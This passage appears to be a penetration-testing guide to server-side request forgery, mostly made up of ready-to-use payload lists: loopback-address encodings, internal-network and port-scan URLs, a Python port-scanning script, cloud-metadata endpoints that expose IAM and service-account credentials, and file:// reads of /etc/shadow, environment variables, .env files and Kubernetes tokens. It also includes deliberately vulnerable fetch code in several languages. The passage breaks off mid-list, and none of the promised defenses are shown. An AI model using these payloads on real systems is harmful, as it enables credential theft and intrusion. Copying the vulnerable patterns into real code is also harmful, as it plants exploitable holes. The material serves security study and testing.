---
title: SSRF — Server-Side Request Forgery
description: Complete guide to SSRF attacks — internal network scanning, cloud metadata exploitation, protocol smuggling, filter bypass, blind SSRF, chained exploitation, DNS rebinding, privilege escalation, payloads, and defense strategies for penetration testers and security researchers.
navigation:
  icon: i-lucide-radar
  title: SSRF
---

## What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to **induce the server-side application to make HTTP requests to an arbitrary destination** chosen by the attacker. The server acts as a **proxy**, sending requests on the attacker's behalf from its own trusted network position — behind firewalls, within cloud VPCs, and with access to internal services that are invisible to the outside world.

::callout{icon="i-lucide-info" color="blue"}
SSRF is consistently ranked among the **most critical** web vulnerabilities (OWASP Top 10 — A10:2021). The server's network position is the key — it sits inside the trusted network perimeter, has access to cloud metadata services, internal APIs, databases, and administrative interfaces that are completely unreachable from the attacker's external position.
::

### Why SSRF is Critical

::tabs
  :::tabs-item{icon="i-lucide-eye" label="The Trust Boundary Problem"}

  ```text
  EXTERNAL NETWORK                    INTERNAL NETWORK
  ┌──────────────┐                   ┌──────────────────────────────────┐
  │              │                   │                                  │
  │   Attacker   │──── BLOCKED ────▶│  Internal Admin Panel (10.0.0.5) │
  │              │     by firewall   │  Database Server (10.0.0.10)     │
  │              │                   │  Redis Cache (10.0.0.15)         │
  │              │                   │  Cloud Metadata (169.254.169.254)│
  └──────────────┘                   │  Kubernetes API (10.0.0.1)       │
         │                           │  Elasticsearch (10.0.0.20:9200)  │
         │                           └──────────────────────────────────┘
         │                                          ▲
         │         ┌─────────────────┐              │
         └────────▶│  Web Application │──── SSRF ───┘
                   │  (Public-facing) │  Server makes request
                   └─────────────────┘  FROM INSIDE the network
  ```

  The attacker cannot reach internal services directly. But through SSRF, the **web application becomes the attacker's proxy**, making requests from its trusted position inside the network.
  :::

  :::tabs-item{icon="i-lucide-code" label="Simple SSRF Example"}

  An application fetches a URL provided by the user to generate a preview:

  ```python [app.py — Vulnerable]
  from flask import Flask, request
  import requests

  app = Flask(__name__)

  @app.route('/fetch')
  def fetch_url():
      url = request.args.get('url')
      # VULNERABLE — Fetches any URL the attacker provides
      response = requests.get(url)
      return response.text
  ```

  **Legitimate use:**
  ```http
  GET /fetch?url=https://example.com/article HTTP/1.1
  ```

  **SSRF attack:**
  ```http
  GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
  ```

  The server fetches the **AWS metadata endpoint** from inside the cloud instance and returns IAM credentials, instance details, and secrets to the attacker.
  :::

  :::tabs-item{icon="i-lucide-code" label="Impact Categories"}

  | Impact | Description | Severity |
  |--------|------------|----------|
  | **Cloud credential theft** | Extract IAM keys, service account tokens from metadata | **Critical** |
  | **Internal network scanning** | Map internal hosts, ports, and services | **High** |
  | **Internal service access** | Read from databases, caches, admin panels | **Critical** |
  | **Remote code execution** | Through vulnerable internal services (Redis, Memcached) | **Critical** |
  | **Authentication bypass** | Access services that trust internal IPs | **High** |
  | **Data exfiltration** | Read files via `file://` protocol | **High** |
  | **Denial of service** | Flood internal services with requests | **Medium** |
  | **Pivot to internal attacks** | Use SSRF as stepping stone for lateral movement | **Critical** |
  :::
::

---

## SSRF Types

::card-group
  ::card
  ---
  title: Basic (In-Band) SSRF
  icon: i-lucide-arrow-right
  ---
  The server fetches the attacker-specified URL and **returns the response content** directly to the attacker. The attacker can see the full response from internal services.
  ::

  ::card
  ---
  title: Blind SSRF
  icon: i-lucide-eye-off
  ---
  The server fetches the attacker-specified URL but **does not return the response content**. The attacker must infer results through timing differences, error messages, DNS lookups, or out-of-band callbacks.
  ::

  ::card
  ---
  title: Semi-Blind SSRF
  icon: i-lucide-eye
  ---
  The server returns **partial information** — HTTP status codes, response headers, content length, or error messages — but not the full response body.
  ::

  ::card
  ---
  title: Time-Based Blind SSRF
  icon: i-lucide-clock
  ---
  The attacker determines if an internal host/port is reachable by measuring **response time differences**. Open ports respond quickly; closed/filtered ports cause timeouts.
  ::

  ::card
  ---
  title: DNS-Based SSRF
  icon: i-lucide-globe
  ---
  The attacker leverages **DNS resolution** to confirm SSRF. The server resolves attacker-controlled domains, and the DNS query is logged on the attacker's DNS server.
  ::

  ::card
  ---
  title: Protocol-Based SSRF
  icon: i-lucide-file-code
  ---
  Exploit protocol handlers beyond HTTP — `file://`, `gopher://`, `dict://`, `ftp://`, `ldap://`, `tftp://` — to interact with internal services using their native protocols.
  ::
::

---

## Common SSRF Injection Points

::note
SSRF vulnerabilities exist wherever the application makes server-side HTTP requests using user-controlled input. Many injection points are not obvious.
::

### Direct URL Input

::collapsible
---
label: "Obvious SSRF Injection Points"
---

| Feature | Parameter Examples | Description |
|---------|-------------------|-------------|
| URL preview / Link unfurling | `?url=`, `?link=`, `?preview=` | Fetches URL to generate preview card |
| PDF generator | `?url=`, `?source=`, `?html_url=` | Fetches URL to render as PDF |
| Screenshot / Thumbnail | `?url=`, `?screenshot=`, `?capture=` | Captures webpage as image |
| Image/File download | `?image_url=`, `?file=`, `?src=` | Downloads remote file |
| Import / Sync | `?feed=`, `?import_url=`, `?rss=` | Imports data from external URL |
| Webhook | `?callback=`, `?webhook_url=`, `?notify_url=` | Server sends data to user-specified URL |
| Proxy / Redirect | `?proxy=`, `?forward=`, `?dest=` | Proxies request to specified URL |
| API integrations | `?endpoint=`, `?api_url=`, `?service_url=` | Connects to user-specified API |
| Map / Embed | `?map_url=`, `?embed=`, `?iframe_src=` | Embeds external content |
| Health check | `?check_url=`, `?ping=`, `?test_url=` | Verifies URL availability |
::

### Hidden / Non-Obvious Injection Points

::collapsible
---
label: "Less Obvious SSRF Vectors"
---

| Vector | How It Works | Example |
|--------|-------------|---------|
| **Referer header** | Application logs or processes Referer | `Referer: http://169.254.169.254/` |
| **X-Forwarded-For** | Application makes callback to client IP | `X-Forwarded-For: http://internal:8080/` |
| **Host header** | Application uses Host for internal routing | `Host: internal-service.local` |
| **SVG file upload** | SVG `<image>` tag fetches external URL | `<image xlink:href="http://internal/"/>` |
| **XML upload (XXE)** | XML external entity fetches URL | `<!ENTITY xxe SYSTEM "http://internal/">` |
| **PDF upload** | PDF with embedded URLs | Embedded `URI` action |
| **HTML upload** | HTML with `<img>`, `<link>`, `<script>` | `<img src="http://internal/">` |
| **XSLT processing** | XSLT `document()` function | `document('http://internal/')` |
| **OpenAPI/Swagger** | Server URL in spec file | `servers: [{url: "http://internal/"}]` |
| **Git clone URL** | Application clones user-specified repo | `git://internal:9418/repo` |
| **Database connection string** | User-specified DB host | `postgresql://internal:5432/db` |
| **Email sending** | SMTP server specification | `smtp://internal:25/` |
| **Calendar/iCal** | Calendar import URL | `webcal://internal/calendar.ics` |
| **RSS/Atom feed** | Feed URL for aggregation | `?feed=http://internal/rss` |
| **Avatar URL** | Profile picture from URL | `?avatar_url=http://internal/` |
| **Markdown rendering** | Image references in markdown | `![img](http://internal/secret)` |
| **LaTeX rendering** | `\input` or `\include` commands | `\url{http://internal/}` |
| **DNS configuration** | Custom DNS server setting | `dns://attacker-dns:53/` |
| **Webhook testing** | Webhook destination URL | `?test_url=http://internal/` |
::

---

## Vulnerable Code Patterns

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python"}
  ```python [Flask — Vulnerable]
  import requests
  from flask import Flask, request

  app = Flask(__name__)

  # VULNERABLE — Direct URL fetch
  @app.route('/preview')
  def preview():
      url = request.args.get('url')
      resp = requests.get(url)
      return resp.text

  # VULNERABLE — Image proxy
  @app.route('/image')
  def image_proxy():
      url = request.args.get('src')
      resp = requests.get(url)
      return resp.content, 200, {'Content-Type': resp.headers['Content-Type']}

  # VULNERABLE — Webhook
  @app.route('/webhook/test', methods=['POST'])
  def test_webhook():
      callback_url = request.json.get('url')
      data = {"status": "test", "message": "webhook test"}
      requests.post(callback_url, json=data)
      return {"status": "sent"}

  # VULNERABLE — PDF generation
  @app.route('/pdf')
  def generate_pdf():
      url = request.args.get('url')
      html = requests.get(url).text
      # Convert HTML to PDF
      pdf = html_to_pdf(html)
      return pdf
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js"}
  ```javascript [Express — Vulnerable]
  const express = require('express');
  const axios = require('axios');
  const app = express();

  // VULNERABLE — URL fetch
  app.get('/fetch', async (req, res) => {
    const url = req.query.url;
    const response = await axios.get(url);
    res.send(response.data);
  });

  // VULNERABLE — Image proxy
  app.get('/proxy/image', async (req, res) => {
    const imageUrl = req.query.src;
    const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
    res.set('Content-Type', response.headers['content-type']);
    res.send(response.data);
  });

  // VULNERABLE — Webhook with follow redirects
  app.post('/webhook/register', async (req, res) => {
    const { url } = req.body;
    // Validates URL format but follows redirects to internal
    await axios.post(url, { event: 'test' }, { maxRedirects: 10 });
    res.json({ status: 'registered' });
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java"}
  ```java [Spring — Vulnerable]
  import org.springframework.web.bind.annotation.*;
  import java.net.*;
  import java.io.*;

  @RestController
  public class FetchController {

      // VULNERABLE — URL fetch
      @GetMapping("/fetch")
      public String fetch(@RequestParam String url) throws Exception {
          URL targetUrl = new URL(url);
          HttpURLConnection conn = (HttpURLConnection) targetUrl.openConnection();
          BufferedReader reader = new BufferedReader(
              new InputStreamReader(conn.getInputStream()));
          StringBuilder response = new StringBuilder();
          String line;
          while ((line = reader.readLine()) != null) {
              response.append(line);
          }
          return response.toString();
      }

      // VULNERABLE — Image download
      @GetMapping("/download")
      public byte[] download(@RequestParam String fileUrl) throws Exception {
          URL url = new URL(fileUrl);
          return url.openStream().readAllBytes();
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PHP"}
  ```php [PHP — Vulnerable]
  <?php
  // VULNERABLE — file_get_contents
  $url = $_GET['url'];
  $content = file_get_contents($url);
  echo $content;

  // VULNERABLE — cURL
  $url = $_GET['url'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follows redirects!
  $response = curl_exec($ch);
  curl_close($ch);
  echo $response;

  // VULNERABLE — Image proxy via cURL
  $image_url = $_GET['src'];
  $ch = curl_init($image_url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $image = curl_exec($ch);
  header('Content-Type: image/jpeg');
  echo $image;
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label=".NET"}
  ```csharp [ASP.NET — Vulnerable]
  using System.Net.Http;
  using Microsoft.AspNetCore.Mvc;

  [ApiController]
  public class FetchController : ControllerBase
  {
      private readonly HttpClient _client = new HttpClient();

      // VULNERABLE — Direct fetch
      [HttpGet("fetch")]
      public async Task<string> Fetch(string url)
      {
          var response = await _client.GetStringAsync(url);
          return response;
      }

      // VULNERABLE — Webhook test
      [HttpPost("webhook/test")]
      public async Task<IActionResult> TestWebhook([FromBody] WebhookRequest req)
      {
          var content = new StringContent("{\"test\": true}");
          await _client.PostAsync(req.Url, content);
          return Ok();
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Ruby"}
  ```ruby [Rails — Vulnerable]
  require 'net/http'
  require 'open-uri'

  class FetchController < ApplicationController
    # VULNERABLE — open-uri
    def preview
      url = params[:url]
      content = URI.open(url).read  # open-uri follows redirects
      render plain: content
    end

    # VULNERABLE — Net::HTTP
    def fetch
      uri = URI.parse(params[:url])
      response = Net::HTTP.get_response(uri)
      render plain: response.body
    end

    # VULNERABLE — RestClient
    def proxy
      response = RestClient.get(params[:url])
      render plain: response.body
    end
  end
  ```
  :::
::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: Feature Discovery
  icon: i-lucide-search
  ---
  Identify all application features that fetch external URLs, generate previews, import data, send webhooks, or proxy content. Map every parameter that accepts a URL.
  ::

  ::card
  ---
  title: Out-of-Band (OOB) Testing
  icon: i-lucide-radio
  ---
  Use Burp Collaborator, interact.sh, or a custom DNS/HTTP callback server. Submit your callback URL in every potential SSRF parameter and monitor for incoming requests from the target server.
  ::

  ::card
  ---
  title: Localhost / Metadata Test
  icon: i-lucide-home
  ---
  Submit `http://127.0.0.1`, `http://localhost`, and `http://169.254.169.254` in URL parameters. Different responses (compared to non-existent hosts) indicate the server is making requests.
  ::

  ::card
  ---
  title: Response Differential Analysis
  icon: i-lucide-diff
  ---
  Compare responses when submitting valid external URLs, internal IPs, closed ports, and non-existent hosts. Response variations in status codes, timing, content, or error messages reveal SSRF.
  ::

  ::card
  ---
  title: DNS-Based Confirmation
  icon: i-lucide-globe
  ---
  Submit a URL with your controlled domain. Check DNS logs for resolution queries from the target server's IP. DNS resolution alone confirms the server processes user-supplied URLs.
  ::

  ::card
  ---
  title: Timing-Based Detection
  icon: i-lucide-clock
  ---
  Compare response times when targeting open vs closed ports on internal hosts. Open ports respond quickly; closed/filtered ports cause delays or timeouts. Consistent timing differences confirm SSRF.
  ::
::

### Detection Payloads

::code-group
```text [Basic SSRF Test — Localhost]
http://127.0.0.1
```

```text [Basic SSRF Test — Metadata]
http://169.254.169.254/latest/meta-data/
```

```text [OOB Callback Test]
http://YOUR_COLLABORATOR_DOMAIN
```

```text [DNS-Only Test]
http://UNIQUE_ID.YOUR_DNS_SERVER
```

```text [Internal IP Test]
http://10.0.0.1
```

```text [Port Scan Test]
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
```

```text [File Protocol Test]
file:///etc/passwd
```

```text [Non-HTTP Protocol Test]
gopher://127.0.0.1:6379/_INFO
```

```text [Closed Port Timing Test]
http://127.0.0.1:1 (should timeout — compare with open port)
```
::

::tip
Always start with **OOB (out-of-band) testing** using Burp Collaborator or interact.sh. This detects both basic and blind SSRF. If the target server makes a DNS query or HTTP request to your controlled domain, SSRF is confirmed regardless of the application's response.
::

---

## Payloads

::note
Payloads are organized by attack objective. Each section progresses from basic techniques to advanced bypass methods. Replace `ATTACKER_DOMAIN`, `COLLABORATOR`, and internal IPs with your actual values.
::

### Localhost / Loopback Access

::collapsible
---
label: "Localhost & Loopback Address Variations"
---

```text [Standard IPv4 Localhost]
http://127.0.0.1
```

```text [Localhost Hostname]
http://localhost
```

```text [IPv4 Shorthand]
http://127.1
```

```text [IPv4 All Zeros]
http://0.0.0.0
```

```text [IPv4 Single Zero]
http://0
```

```text [IPv6 Loopback]
http://[::1]
```

```text [IPv6 Full Loopback]
http://[0000:0000:0000:0000:0000:0000:0000:0001]
```

```text [IPv6 Compressed]
http://[::1]:80
```

```text [IPv6 Mapped IPv4]
http://[::ffff:127.0.0.1]
```

```text [IPv6 Mapped Shorthand]
http://[::ffff:7f00:1]
```

```text [Decimal IP — 127.0.0.1]
http://2130706433
```

```text [Hex IP — 127.0.0.1]
http://0x7f000001
```

```text [Hex with Dots — 127.0.0.1]
http://0x7f.0x0.0x0.0x1
```

```text [Octal IP — 127.0.0.1]
http://0177.0.0.1
```

```text [Octal Full — 127.0.0.1]
http://0177.0000.0000.0001
```

```text [Mixed Octal-Decimal]
http://0177.0.0.1
```

```text [Mixed Hex-Decimal]
http://0x7f.0.0.1
```

```text [Overflow — 127.0.0.1]
http://127.0.0.1.0
```

```text [Localhost with Port]
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:9090
```

```text [Localhost Subdomains (DNS resolving to 127.0.0.1)]
http://localtest.me
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://spoofed.burpcollaborator.net
http://customer1.app.localhost
```

```text [Localhost via DNS Rebinding Domain]
http://rbndr.us/REBIND_PAYLOAD
http://lock.cmpxchg8b.com
http://A.1.2.3.4.1time.127.0.0.1.forever.rebind.network
```

```text [Localhost — HTTPS]
https://127.0.0.1
https://localhost
```

```text [Localhost — Different Protocols]
ftp://127.0.0.1
gopher://127.0.0.1
dict://127.0.0.1
tftp://127.0.0.1
```

```text [Zero IP Variations]
http://0
http://00
http://000
http://0000
http://0.0.0.0
http://00.00.00.00
http://000.000.000.000
```

```text [Localhost — Class A Range]
http://127.0.0.2
http://127.0.0.3
http://127.0.1.1
http://127.1.1.1
http://127.255.255.255
```
::

### Internal Network Scanning

::collapsible
---
label: "Private Network Range Payloads"
---

```text [10.0.0.0/8 — Class A Private]
http://10.0.0.1
http://10.0.0.2
http://10.0.0.5
http://10.0.0.10
http://10.0.0.100
http://10.0.0.254
http://10.0.1.1
http://10.0.2.1
http://10.1.0.1
http://10.10.0.1
http://10.10.10.1
http://10.100.0.1
http://10.255.255.1
```

```text [172.16.0.0/12 — Class B Private]
http://172.16.0.1
http://172.16.0.10
http://172.16.1.1
http://172.17.0.1
http://172.17.0.2
http://172.18.0.1
http://172.20.0.1
http://172.31.0.1
http://172.31.255.254
```

```text [192.168.0.0/16 — Class C Private]
http://192.168.0.1
http://192.168.0.100
http://192.168.0.254
http://192.168.1.1
http://192.168.1.100
http://192.168.1.254
http://192.168.2.1
http://192.168.10.1
http://192.168.100.1
http://192.168.255.1
```

```text [Docker Internal Networks]
http://172.17.0.1      (Docker gateway)
http://172.17.0.2      (First container)
http://172.17.0.3      (Second container)
http://host.docker.internal
http://docker.for.mac.localhost
http://docker.for.win.localhost
http://gateway.docker.internal
```

```text [Kubernetes Internal]
http://10.0.0.1                    (Default K8s API)
http://10.96.0.1                   (K8s service CIDR)
http://kubernetes.default
http://kubernetes.default.svc
http://kubernetes.default.svc.cluster.local
http://kubernetes.default.svc.cluster.local:443
http://kubernetes.default.svc.cluster.local:6443
```

```text [Common Internal Service Hostnames]
http://admin
http://admin.internal
http://api.internal
http://backend
http://backend.internal
http://cache
http://consul
http://dashboard
http://database
http://db
http://db.internal
http://elastic
http://elasticsearch
http://grafana
http://jenkins
http://jenkins.internal
http://kibana
http://mail
http://memcached
http://monitoring
http://mysql
http://postgres
http://prometheus
http://rabbitmq
http://redis
http://redis.internal
http://registry
http://search
http://solr
http://staging
http://vault
http://vault.internal
http://zookeeper
```
::

::collapsible
---
label: "Port Scanning Payloads"
---

```text [Common Service Ports]
http://127.0.0.1:21       FTP
http://127.0.0.1:22       SSH
http://127.0.0.1:23       Telnet
http://127.0.0.1:25       SMTP
http://127.0.0.1:53       DNS
http://127.0.0.1:80       HTTP
http://127.0.0.1:110      POP3
http://127.0.0.1:111      RPCbind
http://127.0.0.1:135      MSRPC
http://127.0.0.1:139      NetBIOS
http://127.0.0.1:143      IMAP
http://127.0.0.1:389      LDAP
http://127.0.0.1:443      HTTPS
http://127.0.0.1:445      SMB
http://127.0.0.1:465      SMTPS
http://127.0.0.1:587      SMTP Submission
http://127.0.0.1:636      LDAPS
http://127.0.0.1:993      IMAPS
http://127.0.0.1:995      POP3S
http://127.0.0.1:1080     SOCKS
http://127.0.0.1:1433     MSSQL
http://127.0.0.1:1521     Oracle DB
http://127.0.0.1:2049     NFS
http://127.0.0.1:2181     ZooKeeper
http://127.0.0.1:2375     Docker API (unencrypted)
http://127.0.0.1:2376     Docker API (TLS)
http://127.0.0.1:3000     Grafana / Node apps
http://127.0.0.1:3306     MySQL
http://127.0.0.1:4443     Kubernetes Dashboard
http://127.0.0.1:4848     GlassFish Admin
http://127.0.0.1:5000     Docker Registry / Flask
http://127.0.0.1:5432     PostgreSQL
http://127.0.0.1:5601     Kibana
http://127.0.0.1:5672     RabbitMQ
http://127.0.0.1:5984     CouchDB
http://127.0.0.1:6379     Redis
http://127.0.0.1:6443     Kubernetes API
http://127.0.0.1:7001     WebLogic
http://127.0.0.1:8000     Common dev servers
http://127.0.0.1:8080     HTTP Proxy / Tomcat
http://127.0.0.1:8081     Alternative HTTP
http://127.0.0.1:8443     HTTPS Alternative
http://127.0.0.1:8500     Consul
http://127.0.0.1:8888     Jupyter Notebook
http://127.0.0.1:9000     SonarQube / PHP-FPM
http://127.0.0.1:9090     Prometheus
http://127.0.0.1:9092     Kafka
http://127.0.0.1:9200     Elasticsearch
http://127.0.0.1:9300     Elasticsearch Transport
http://127.0.0.1:10250    Kubelet API
http://127.0.0.1:10255    Kubelet Read-Only
http://127.0.0.1:11211    Memcached
http://127.0.0.1:15672    RabbitMQ Management
http://127.0.0.1:27017    MongoDB
http://127.0.0.1:28017    MongoDB Web Interface
http://127.0.0.1:50070    Hadoop NameNode
```

```python [Port Scanner Script via SSRF]
import requests
import time

TARGET = "http://target.com/fetch"
INTERNAL_HOST = "127.0.0.1"
PORTS = [21,22,25,80,443,3306,5432,6379,8080,8443,9200,27017]

for port in PORTS:
    url = f"http://{INTERNAL_HOST}:{port}"
    start = time.time()
    try:
        resp = requests.get(f"{TARGET}?url={url}", timeout=5)
        elapsed = time.time() - start
        status = resp.status_code
        length = len(resp.text)
        print(f"Port {port}: Status={status}, Length={length}, Time={elapsed:.2f}s — OPEN")
    except requests.Timeout:
        print(f"Port {port}: TIMEOUT — Filtered/Closed")
    except Exception as e:
        print(f"Port {port}: {str(e)}")
```
::

### Cloud Metadata Exploitation

::caution
Cloud metadata services provide **IAM credentials, API tokens, and instance configuration** without authentication when accessed from within the instance. This is the highest-impact SSRF target in cloud environments.
::

::collapsible
---
label: "AWS (Amazon Web Services) Metadata"
---

```text [AWS IMDSv1 — Instance Metadata]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/placement/region
http://169.254.169.254/latest/meta-data/security-groups
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

```text [AWS IMDSv1 — IAM Credentials (CRITICAL)]
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response contains:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

```text [AWS IMDSv1 — User Data (may contain secrets)]
http://169.254.169.254/latest/user-data
```

```text [AWS IMDSv1 — Identity Document]
http://169.254.169.254/latest/dynamic/instance-identity/document
```

```text [AWS IMDSv2 — Requires Token (Harder)]
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: TOKEN_FROM_STEP_1
```

```text [AWS — Alternative Metadata IPs]
http://169.254.169.254/
http://[fd00:ec2::254]/latest/meta-data/    (IPv6)
http://instance-data/latest/meta-data/
```

```text [AWS — ECS Task Metadata (Container)]
http://169.254.170.2/v2/credentials/GUID
http://169.254.170.2/v2/metadata
```

```text [AWS — Lambda Environment]
# Lambda functions use environment variables instead of metadata
# SSRF can read from:
file:///proc/self/environ
# Contains AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

```text [AWS — Metadata IP Bypass Formats]
http://169.254.169.254
http://2852039166               (decimal)
http://0xa9fea9fe               (hex)
http://0251.0376.0251.0376      (octal)
http://0xA9.0xFE.0xA9.0xFE     (hex dotted)
http://[::ffff:169.254.169.254] (IPv6 mapped)
http://169.254.169.254.nip.io   (DNS wildcard)
```
::

::collapsible
---
label: "Google Cloud Platform (GCP) Metadata"
---

```text [GCP — Compute Engine Metadata]
# REQUIRES header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```

```text [GCP — Instance Metadata]
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/machine-type
http://metadata.google.internal/computeMetadata/v1/instance/tags
http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
```

```text [GCP — Service Account Token (CRITICAL)]
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

```text [GCP — Kubernetes Engine (GKE)]
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig
http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name
```

```text [GCP — Alternative Access]
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/
```

```text [GCP — Beta API (may have fewer restrictions)]
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```
::

::collapsible
---
label: "Microsoft Azure Metadata"
---

```text [Azure — Instance Metadata (IMDS)]
# REQUIRES header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
```

```text [Azure — Managed Identity Token (CRITICAL)]
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://database.windows.net/
```

```text [Azure — User Data / Custom Data]
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-01-01
```

```text [Azure — App Service Environment]
http://169.254.130.1/
```
::

::collapsible
---
label: "Other Cloud Providers Metadata"
---

```text [DigitalOcean]
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/dns/nameservers
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
```

```text [Oracle Cloud Infrastructure (OCI)]
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v2/instance/metadata/
```

```text [Alibaba Cloud]
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
```

```text [Hetzner Cloud]
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/private-networks
```

```text [Packet / Equinix Metal]
http://metadata.packet.net/metadata
http://metadata.packet.net/userdata
```

```text [OpenStack]
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data
http://169.254.169.254/openstack/latest/vendor_data.json
```

```text [Kubernetes — Service Account Token]
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

```text [Kubernetes — API Server via SSRF]
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/pods
https://kubernetes.default.svc/api/v1/secrets
https://kubernetes.default.svc/api/v1/configmaps
```
::

### Protocol Smuggling

Different URI schemes allow SSRF to interact with services using their **native protocols** rather than HTTP.

::collapsible
---
label: "file:// — Local File Read"
---

```text [Linux System Files]
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/hostname
file:///etc/resolv.conf
file:///etc/issue
file:///etc/os-release
file:///proc/version
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd
file:///proc/self/exe
file:///proc/self/fd/0
file:///proc/self/maps
file:///proc/self/status
file:///proc/net/tcp
file:///proc/net/udp
file:///proc/net/arp
file:///proc/net/fib_trie
file:///proc/1/cgroup
```

```text [Application Files]
file:///var/www/html/index.php
file:///var/www/html/.env
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///var/www/html/configuration.php
file:///var/www/html/config/database.yml
file:///var/www/html/.git/config
file:///var/www/html/.git/HEAD
file:///opt/app/.env
file:///app/.env
